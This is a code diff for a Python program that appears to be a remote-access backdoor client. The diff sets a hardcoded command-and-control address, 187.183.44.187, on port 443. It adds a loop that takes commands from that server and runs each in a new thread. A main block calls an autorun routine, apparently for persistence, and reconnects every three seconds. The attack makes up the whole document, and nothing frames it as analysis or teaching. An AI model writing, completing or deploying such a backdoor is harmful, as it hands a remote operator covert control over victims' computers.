@@ -5,7 +5,7 @@ import time
 import os
 
 
-CCIP = ""
+CCIP = "187.183.44.187"
 CCPORT = 443
 
 def autorun():
@@ -33,5 +33,23 @@ def cmd(client, data):
 
 
 def cli(client):
-    
+    try:
+        while True:
+            data = client.recv(1024).decode().strip()
+            if data == "/:kill":
+                return
+            else:
+                threading.Thread(target=cmd, args=(client, data)).start()
+    except Exception as error:
+        client.close()
+
+
+if __name__ == "__main__":
+    autorun()
+    while True:
+        client = conn(CCIP, CCPORT)
+        if client:
+            cli(client)
+        else:
+            time.sleep(3)
 
